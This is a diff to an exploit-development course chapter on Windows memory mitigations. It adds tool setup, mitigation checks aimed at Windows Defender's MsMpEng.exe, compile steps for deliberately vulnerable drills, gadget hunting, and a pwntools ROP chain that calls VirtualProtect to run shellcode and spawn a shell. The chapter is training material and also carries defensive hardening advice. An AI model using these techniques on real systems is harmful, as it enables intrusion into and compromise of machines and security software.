@@ -33,6 +33,103 @@ of the CPU.
 
 ---
 
+## WINDOWS SETUP
+
+Every tool mentioned in this chapter. Install them all before you touch
+the drills. Do it once, do it right.
+
+### Tools Required
+
+| Tool | Purpose | Where to Get It |
+|------|---------|----------------|
+| **rp++** | ROP gadget finder — scans PE binaries for gadget sequences | https://github.com/0vercl0k/rp/releases — download `rp-win-x64.exe` |
+| **ROPgadget** | Python-based ROP gadget finder — alternative to rp++, supports scripting | `pip install ROPgadget` |
+| **CFF Explorer** | PE file inspector — reads DLL headers, characteristics, mitigation flags | https://ntcore.com/?page_id=388 — download NTCore Explorer Suite |
+| **PE-bear** | PE editor/viewer — alternative to CFF Explorer, reads DYNAMICBASE/HIGHENTROPYVA | https://github.com/hasherezade/pe-bear/releases |
+| **Python 3** | Required for ROPgadget and drill scripts | Already installed — verify below |
+| **pwntools** | Python exploit framework — used in drill scripts for crafting payloads | `pip install pwntools` |
+| **mingw-gcc** | Windows GCC compiler — compiles the C drill programs | https://winlibs.com/ — download the latest GCC release (UCRT, 64-bit) |
+| **Visual Studio Build Tools** | Alternative C compiler — MSVC for Windows-native builds | https://aka.ms/vs/17/release/vs_BuildTools.exe |
+| **Process Explorer** | Sysinternals — shows per-process mitigation policies visually | https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer |
+| **WinDbg** | Microsoft debugger — essential for hands-on mitigation testing | `winget install Microsoft.WinDbg` (or via Windows SDK) |
+
+### Tools That Require WSL2
+
+**ROPgadget** and **pwntools** run natively on Windows under Python 3.
+No WSL required for this chapter. WSL2 becomes mandatory in Chapter 06
+when you start working with ELF binaries and Linux-targeted shellcode.
+
+To install WSL2 when you get there:
+```powershell
+# Run in PowerShell as Administrator
+wsl --install
+```
+
+### Install Commands (Windows — Run These Now)
+
+```powershell
+# Verify Python is present
+python --version
+# Expected: Python 3.x.x
+
+# Install ROPgadget
+pip install ROPgadget
+
+# Install pwntools (Python exploit framework used in drills)
+pip install pwntools
+
+# Install WinDbg via winget
+winget install Microsoft.WinDbg
+
+# Install mingw-gcc via winget (if not using MSVC)
+winget install mingw.mingw-w64
+```
+
+### Install rp++ Manually
+
+rp++ has no pip package. Download the binary directly:
+
+1. Go to https://github.com/0vercl0k/rp/releases
+2. Download `rp-win-x64.exe`
+3. Rename it to `rp.exe` and drop it somewhere on your PATH
+   (e.g., `C:\Windows\System32\` or a custom tools folder you've added to PATH)
+
+### Verification Commands
+
+```powershell
+# Verify rp++ is installed and on PATH
+rp --version
+# Expected: rp++ vX.X (XXXX-XX-XX)
+
+# Verify ROPgadget
+ROPgadget --version
+# Expected: ROPgadget vX.X
+
+# Verify pwntools (must be in Python)
+python -c "import pwn; print(pwn.__version__)"
+# Expected: X.X.X
+
+# Verify WinDbg is accessible
+where windbg
+# Expected: C:\Program Files\WindowsApps\Microsoft.WinDbg_...\windbg.exe
+
+# Verify mingw gcc
+gcc --version
+# Expected: gcc (MinGW...) X.X.X
+
+# Verify CFF Explorer (manual check — no CLI)
+# Just open it and drag a DLL onto it — if it shows headers, it works
+```
+
+### Admin Rights Warning
+
+**Get-ProcessMitigation** and **Process Explorer** require ADMIN to
+inspect system processes like MsMpEng.exe. Right-click PowerShell →
+"Run as Administrator" before running the mitigation check commands
+in this chapter.
+
+---
+
 ## DEP (Data Execution Prevention) / NX Bit
 
 ### What It Prevents
@@ -171,12 +268,51 @@ Most modern Microsoft binaries ship with this flag. mpengine.dll
 included.
 
 Check it yourself:
-```
+```powershell
+# dumpbin is part of Visual Studio Build Tools — run in Developer Command Prompt
 dumpbin /headers mpengine.dll | findstr "high entropy"
+# Expected output if flag is set:
+#                   HIGH ENTROPY VA
 ```
+
+#### Expected Output
+
+**Success** — flag is set:
+```
+                HIGH ENTROPY VA
+```
+
+**Failure looks like "no output returned"** — means the flag is NOT set
+in this binary. That DLL only has 14-bit randomization. Note it —
+that's a weaker ASLR target.
+
+**Failure looks like "'dumpbin' is not recognized"** — means you're
+not in a Visual Studio Developer Command Prompt. Open Start → search
+"Developer Command Prompt for VS 2022" and run it from there. Or use
+CFF Explorer (GUI) instead.
 
 Or in CFF Explorer / PE-bear: look for IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA
 in the DLL characteristics field.
+
+### How to Use CFF Explorer to Check HIGHENTROPYVA
+
+CFF Explorer is a GUI tool for reading PE file headers. Here's exactly
+what to do — there's no command line for it:
+
+1. Open CFF Explorer (the `.exe` you downloaded from ntcore.com)
+2. File → Open → navigate to the DLL you want to inspect
+   (e.g., `C:\Program Files\Windows Defender\mpengine.dll`)
+3. In the left panel, click **NT Headers → Optional Header**
+4. Look at the **DLL Characteristics** field
+5. Click the `...` button next to it to expand the flags
+6. Check if **IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA** is ticked
+
+If it's ticked: 19-bit ASLR. You need an info leak to beat it.
+If it's not ticked: 14-bit ASLR. Still random but weaker.
+
+Also check **IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE** — if this flag
+is NOT set, the DLL loads at a fixed address every time. That's a
+free ASLR bypass for any gadgets in it.
 
 ### The Bypass: Information Leak
 
@@ -378,14 +514,14 @@ CET-enabled CPUs, the branch tracking state machine checks for it.
 ```nasm
 ; Valid target — has ENDBRANCH
 my_function:
-    endbr64                ; ← CET checks for this
-    push rbp
-    mov rbp, rsp
+    endbr64                ; ← CET checks for this on indirect jumps/calls
+    push rbp               ; ← normal function prologue
+    mov rbp, rsp           ; ← set up stack frame
     ...
 
 ; If you redirect an indirect call to the middle of a function:
 my_function+0x10:
-    mov rax, [rcx]         ; ← no ENDBRANCH here
+    mov rax, [rcx]         ; ← no ENDBRANCH here — CET will reject this target
     ...
 ; → #CP exception, process dies
 ```
@@ -458,9 +594,33 @@ ACG is used by:
 - Windows Defender Application Guard
 
 **MsMpEng.exe**: Not confirmed to have ACG enabled. Verify with:
-```
+```powershell
+# Run PowerShell as Administrator
 Get-ProcessMitigation -Name MsMpEng.exe
+# Look for: DynamicCode → ProhibitDynamicCode : ON (or OFF)
 ```
+
+#### Expected Output
+
+**Success — ACG is OFF on MsMpEng:**
+```
+ProcessName: MsMpEng
+...
+DynamicCode:
+  ProhibitDynamicCode          : OFF
+```
+This means the VirtualProtect → RWX → shellcode path is viable (after
+you've defeated DEP via ROP and ASLR via info leak).
+
+**Success — ACG is ON on MsMpEng:**
+```
+DynamicCode:
+  ProhibitDynamicCode          : ON
+```
+This means you need a fully ROP-based payload. No shellcode stage at all.
+
+**Failure looks like "Access is denied"** — means you're not running
+PowerShell as Administrator. Close it and reopen with "Run as Administrator".
 
 If ACG is NOT on MsMpEng, the VirtualProtect → RWX → shellcode path
 remains viable after you defeat DEP (via ROP to VirtualProtect) and
@@ -490,8 +650,9 @@ STACK (with /GS):
 
 Before the function returns, the compiler inserts a check:
 ```c
-// Compiler-generated epilogue:
+// Compiler-generated epilogue — you do NOT write this, the compiler adds it:
 if (stack_cookie != __security_cookie ^ frame_pointer) {
+    // Cookie is corrupted → someone smashed the stack
     __report_gsfailure();  // calls TerminateProcess → dead
 }
 ret;  // only reached if cookie is intact
@@ -602,10 +763,10 @@ Both NT Heap and Segment Heap validate doubly-linked list pointers
 before unlinking a chunk:
 
 ```c
-// Safe unlink check:
+// Safe unlink check — allocator runs this automatically before every free():
 if (chunk->flink->blink != chunk || chunk->blink->flink != chunk) {
-    // Corrupted list detected → terminate or heap corruption error
-    RtlReportCriticalFailure();
+    // Pointer consistency check failed — list is corrupted
+    RtlReportCriticalFailure();  // crash the process
 }
 ```
 
@@ -631,13 +792,46 @@ Get-ProcessMitigation -Name MsMpEng.exe
 # Right-click MsMpEng.exe → Properties → Mitigation Policies tab
 ```
 
+#### Expected Output
+
+**Success:**
+```
+ProcessName: MsMpEng
+
+DEP:
+  Enable                       : ON
+  EmulateAtlThunks             : OFF
+
+ASLR:
+  EnableBottomUpRandomization  : ON
+  EnableHighEntropy             : ON
+  EnableForceRelocateImages    : ON
+  DisallowStrippedImages       : OFF
+
+CFG:
+  Enable                       : ON
+  SuppressExports              : OFF
+  StrictMode                   : OFF
+...
+```
+
+Your job: read every ON/OFF and map it to the table below.
+
+**Failure looks like "Access is denied"** — not running as admin.
+Close PowerShell, right-click → "Run as Administrator", try again.
+
+**Failure looks like "Cannot find a process with the name MsMpEng.exe"** —
+Defender isn't running or the process has a different name on your build.
+Open Task Manager first to confirm the exact process name.
+
 You can also enumerate programmatically:
 ```c
-// GetProcessMitigationPolicy() with each PROCESS_MITIGATION_POLICY enum value
+// GetProcessMitigationPolicy() — call once per mitigation type
+// hProcess must be opened with PROCESS_QUERY_INFORMATION access
 GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy, &dep, sizeof(dep));
 GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy, &aslr, sizeof(aslr));
 GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));
-// ... etc
+// ... etc — one call per PROCESS_MITIGATION_POLICY enum value
 ```
 
 ### What's ON (Confirmed Or Near-Certain)
@@ -729,6 +923,73 @@ comes first. The 0-day is a side effect.
 
 ---
 
+## DEFENDER TAKEAWAY
+
+You've just mapped the walls that Windows built. Now flip it: you're
+the defender. Here's what these mitigations mean on Monday morning
+when you're hardening systems or investigating a suspicious process.
+
+- **Enable DEP system-wide.** Go to System Properties → Advanced →
+  Performance Settings → Data Execution Prevention → "Turn on DEP for
+  all programs and services except those I select." This forces hardware
+  NX on everything. Any legacy app that breaks was relying on executable
+  stack/heap — that's a red flag on its own.
+
+- **Enforce ASLR mandatory relocation.** In Windows Security →
+  App & browser control → Exploit protection settings → System settings,
+  set "Force randomization for images (Mandatory ASLR)" to ON.
+  This forces /DYNAMICBASE on ALL binaries, even ones compiled without it.
+  Free ASLR upgrade for legacy DLLs that ship without the flag.
+
+- **Check your processes for missing mitigations (Windows Event ID 1: WER).
+  Crashes that trigger Windows Error Reporting before a mitigation can log
+  are suspicious. Enable WER logging and watch for MsMpEng, lsass, and
+  svchost crashes — those are exactly what a failed exploit attempt looks
+  like.**
+
+- **Windows Event ID 10: WMI activity and Event ID 4688: Process creation.**
+  A successful CFG bypass that pivots to cmd.exe or powershell.exe will
+  generate a 4688. Enable process creation auditing: `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`. Correlate
+  with parent process — cmd.exe spawned from MsMpEng.exe is immediately
+  suspicious.
+
+- **Audit non-ASLR DLLs loading into high-value processes.** Use Process
+  Explorer: View → Lower pane → DLLs. Sort by "Base" column. Any DLL
+  loading at a round, static address (like `0x10000000` exactly) is
+  compiled without /DYNAMICBASE. That's a fixed-address gadget source for
+  an attacker. Identify it, report it to the vendor, or quarantine the
+  software.
+
+- **Deploy Hardware-enforced Stack Protection where available.** If your
+  CPUs support CET (Intel 11th gen+, AMD Zen 3+), ensure Windows 11 has
+  it enabled for high-value processes. Check in Process Explorer:
+  right-click a process → Properties → Mitigation Policies →
+  look for "Hardware-enforced Stack Protection." If it shows OFF on
+  a system process and your hardware supports it, that's a gap worth
+  raising with your security team.
+
+- **Use Get-ProcessMitigation as a regular audit tool.** Run it weekly
+  against your crown-jewel processes. If a software update REMOVES a
+  mitigation (vendors sometimes do this to fix compatibility), you'll
+  catch it. Pipe the output to a log file and diff it against last week.
+  ```powershell
+  # Save current mitigation state for all processes
+  Get-Process | ForEach-Object {
+      try { Get-ProcessMitigation -Id $_.Id } catch {}
+  } | Out-File "C:\Logs\mitigations_$(Get-Date -Format yyyyMMdd).txt"
+  ```
+
+- **Heap spray attempts leave a memory footprint.** If an attacker is
+  spraying the heap with thousands of identical allocations to beat LFH
+  randomization, memory usage of the target process will spike hard and
+  fast before any crash. Monitor with Performance Monitor (perfmon) or
+  Task Manager — a sudden jump of hundreds of MB in a process that
+  normally sits stable is worth investigating. Correlate with network
+  activity if the target process handles external input (like an
+  antivirus engine scanning downloaded files).
+
+---
+
 ## Key Terms (Add to Glossary)
 
 | Term | Definition |
@@ -752,6 +1013,10 @@ comes first. The 0-day is a side effect.
 | **LFH randomization** | Low Fragmentation Heap randomizes allocation order within size buckets to hinder heap grooming |
 | **Safe unlinking** | Allocator validates doubly-linked list pointer consistency before unlink; blocks classic heap metadata attacks |
 | **RWX** | Read-Write-Execute — memory permission triple that DEP/ACG prevent; the holy grail for shellcode injection |
+| **rp++** | Windows ROP gadget finder — scans PE binaries and outputs every gadget sequence with its address |
+| **ROPgadget** | Python-based ROP gadget scanner — alternative to rp++, scriptable, outputs gadgets for chaining |
+| **CFF Explorer** | PE file header inspector — GUI tool for reading DLL characteristics including HIGHENTROPYVA and DYNAMICBASE flags |
+| **ENDBRANCH / endbr64** | Intel CET instruction marking a valid indirect branch target; indirect jumps/calls that don't land on it trigger a #CP exception |
 
 ---
 
@@ -764,6 +1029,45 @@ to `system()`, and print the base address to prove ASLR is defeated.
 ASLR is ON. DEP is ON. You can't brute-force. Find the leak. Read
 the pointer. Do the math.
 
+### Compile Instructions (Drill 03)
+
+```powershell
+# Navigate to the drill directory
+cd C:\path\to\DRILLS\03_info_leak
+
+# Compile with mingw-gcc — disable stack cookies to isolate the info-leak primitive
+# /DYNAMICBASE is ON by default with mingw, so ASLR will be active
+gcc -o vuln.exe vuln.c -fno-stack-protector
+
+# Run the target
+.\vuln.exe
+
+# Run the exploit script against it (Python + pwntools)
+python exploit.py
+```
+
+#### Expected Output (Drill 03)
+
+**Success:**
+```
+[*] Triggering out-of-bounds read...
+[+] Leaked pointer: 0x00007ffabc123456
+[+] Calculated ntdll base: 0x00007ffabc000000
+[+] system() address: 0x00007ffabc0a1234
+[*] ASLR defeated. Addresses calculated.
+```
+
+**Failure looks like "Leaked pointer: 0x0000000000000000"** — the OOB
+read hit a null page or the offset is wrong. Adjust the read offset in
+the exploit script — you're not hitting the pointer you think you are.
+
+**Failure looks like "Connection refused" or process crashes immediately** —
+the vulnerable program crashed before sending data back. Check that
+the program is actually running and listening before launching the
+exploit script.
+
+---
+
 ## Drill 04 — ROP Chain
 
 Go to `DRILLS/04_rop_chain/`. A vulnerable program has a stack
@@ -775,3 +1079,168 @@ redirect execution to it.
 You have the DLL base (no ASLR for this drill — we combine mitigations
 in later drills). Find gadgets with `rp++` or `ROPgadget`. Chain them.
 Pop the shell.
+
+### Compile Instructions (Drill 04)
+
+```powershell
+# Navigate to the drill directory
+cd C:\path\to\DRILLS\04_rop_chain
+
+# Compile with MSVC (Developer Command Prompt) — DEP is on by default,
+# disable stack cookies to isolate the ROP exercise
+cl.exe /GS- /link /NXCOMPAT /OUT:vuln.exe vuln.c
+
+# OR with mingw-gcc:
+gcc -o vuln.exe vuln.c -fno-stack-protector -Wl,--nxcompat
+
+# Confirm DEP is on for the compiled binary
+dumpbin /headers vuln.exe | findstr "NX compatible"
+# Expected: NX compatible
+```
+
+### Finding Gadgets With rp++
+
+rp++ scans a PE binary (or a loaded DLL) and prints every usable
+gadget — the instruction sequence plus the address where it lives.
+
+```powershell
+# Scan a DLL for gadgets — output to a text file for easy searching
+rp.exe --file C:\Windows\System32\ntdll.dll --rop 5 > ntdll_gadgets.txt
+#       ^^^^ binary to scan                  ^^^ max gadget length in instructions
+
+# Search the output for a specific gadget type
+# (use findstr on Windows or grep in Git Bash)
+findstr /C:"pop rdi ; ret" ntdll_gadgets.txt
+# Expected: lines like:
+# 0x00007ffa12345678: pop rdi ; ret  (1 found)
+```
+
+#### Expected Output (rp++ scan)
+
+**Success:**
+```
+Wait a few seconds, rp++ is working !
+Done.
+A total of 14823 gadgets found.
+You want to see them ? Let's rock !
+
+0x00007ffa12340001: add al, 0x24 ; ret  ;  (1 found)
+0x00007ffa12340012: add byte [rax], al ; ret  ;  (1 found)
+...
+```
+
+**Failure looks like "The system cannot find the file specified"** —
+the DLL path is wrong. Check the path exists with `dir` first, then
+re-run rp++ with the corrected path.
+
+**Failure looks like "rp is not recognized"** — rp.exe is not on your
+PATH. Either add its folder to PATH or use the full path:
+`C:\tools\rp.exe --file ...`
+
+### Finding Gadgets With ROPgadget
+
+ROPgadget is the Python alternative — slower than rp++ but easier
+to script and filter:
+
+```powershell
+# Scan a DLL for all gadgets
+ROPgadget --binary C:\Windows\System32\ntdll.dll > ntdll_gadgets.txt
+
+# Search for a specific gadget inline (no output file needed)
+ROPgadget --binary C:\Windows\System32\ntdll.dll --rop --re "pop rdi"
+# Expected: table of matching gadgets with addresses
+
+# Find a ret gadget (needed as chain terminator)
+ROPgadget --binary C:\Windows\System32\ntdll.dll --ret
+```
+
+#### Expected Output (ROPgadget)
+
+**Success:**
+```
+Gadgets information
+============================================================
+0x00007ffa12340078 : pop rdi ; ret
+0x00007ffa12340102 : pop rsi ; ret
+0x00007ffa12340201 : pop rcx ; ret
+...
+
+Unique gadgets found: 9823
+```
+
+**Failure looks like "ROPgadget is not recognized"** — not installed.
+Run `pip install ROPgadget` and retry.
+
+**Failure looks like "No gadget found"** — the regex is too strict.
+Try a shorter pattern. `--re "pop rdi"` should match if the gadget
+exists; `--re "pop rdi ; ret"` requires the exact sequence.
+
+### Building The ROP Chain (Drill 04)
+
+```python
+# exploit.py — skeleton for Drill 04 ROP chain
+# Fill in the gadget addresses from your rp++/ROPgadget output
+
+from pwn import *                   # pwntools for payload construction
+
+# Connect to the vulnerable process (adjust as needed)
+p = process("./vuln.exe")
+
+# --- Addresses (no ASLR for this drill — static addresses) ---
+ntdll_base     = 0x00007ffa12340000  # confirmed from rp++ scan
+pop_rcx        = ntdll_base + 0x1234 # "pop rcx ; ret" — load 1st arg
+pop_rdx        = ntdll_base + 0x5678 # "pop rdx ; ret" — load 2nd arg
+pop_r8         = ntdll_base + 0x9abc # "pop r8  ; ret" — load 3rd arg
+pop_r9         = ntdll_base + 0xdef0 # "pop r9  ; ret" — load 4th arg
+virtual_protect = 0x00007ffa99001234 # VirtualProtect — valid CFG target
+
+shellcode_addr  = 0x00401000         # where your shellcode lives (pre-staged)
+shellcode_size  = 0x1000             # size to mark executable
+
+# --- Build the ROP chain ---
+# Windows x64 calling convention: args go in RCX, RDX, R8, R9
+rop = b""
+rop += p64(pop_rcx)        # gadget: pop rcx ; ret
+rop += p64(shellcode_addr) # arg1 (lpAddress): page to make executable
+rop += p64(pop_rdx)        # gadget: pop rdx ; ret
+rop += p64(shellcode_size) # arg2 (dwSize): size of region
+rop += p64(pop_r8)         # gadget: pop r8 ; ret
+rop += p64(0x40)           # arg3 (flNewProtect): PAGE_EXECUTE_READWRITE
+rop += p64(pop_r9)         # gadget: pop r9 ; ret
+rop += p64(shellcode_addr) # arg4 (lpflOldProtect): where to write old perms
+rop += p64(virtual_protect)# call VirtualProtect — CFG-valid target
+rop += p64(shellcode_addr) # after VirtualProtect returns, execute shellcode
+
+# --- Craft the full overflow payload ---
+padding = b"A" * 72        # fill buffer up to return address (find offset first)
+payload = padding + rop    # overwrite return address with first ROP gadget
+
+p.send(payload)            # send to vulnerable process
+p.interactive()            # drop to interactive shell if it worked
+```
+
+#### Expected Output (Drill 04)
+
+**Success:**
+```
+[+] Starting local process './vuln.exe': pid 1234
+[*] Switching to interactive mode
+$ whoami
+desktop-abc\george
+$
+```
+
+**Failure looks like "Segmentation fault" or "Access violation" immediately** —
+your padding offset is wrong. The return address overwrite isn't landing
+on the first ROP gadget. Use a cyclic pattern to find the exact offset:
+`cyclic(200)` from pwntools, send it, check the crash address in WinDbg.
+
+**Failure looks like the process crashes at a gadget address** — the
+gadget address is wrong. Double-check your rp++/ROPgadget output and
+make sure you're adding the correct offset to the correct base address.
+
+**Failure looks like "STATUS_ACCESS_VIOLATION at VirtualProtect"** —
+ACG might be on for this binary (unlikely for the drill, but verify
+with `Get-ProcessMitigation`). Alternatively, the arguments to
+VirtualProtect are wrong — check that lpflOldProtect points to
+writable memory, not a random address.
